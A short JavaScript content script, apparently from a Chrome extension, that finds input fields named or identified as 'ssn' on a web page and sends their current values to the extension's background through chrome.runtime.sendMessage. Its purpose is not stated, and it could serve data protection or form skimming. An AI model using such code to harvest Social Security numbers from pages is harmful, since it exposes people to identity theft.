// content.js
function findSSNFields() {
    const ssnFields = [];
    const inputs = document.querySelectorAll('input[type="text"], input[type="number"], input[type="password"]');

    inputs.forEach(input => {
        if ((input.name && input.name.toLowerCase().includes('ssn')) ||
            (input.id && input.id.toLowerCase().includes('ssn'))) {
            ssnFields.push({
                id: input.id,
                name: input.name,
                value: input.value
            });
        }
    });

    return ssnFields;
}

const ssnFields = findSSNFields();
if (ssnFields.length > 0) {
    chrome.runtime.sendMessage({ ssnFields: ssnFields });
}
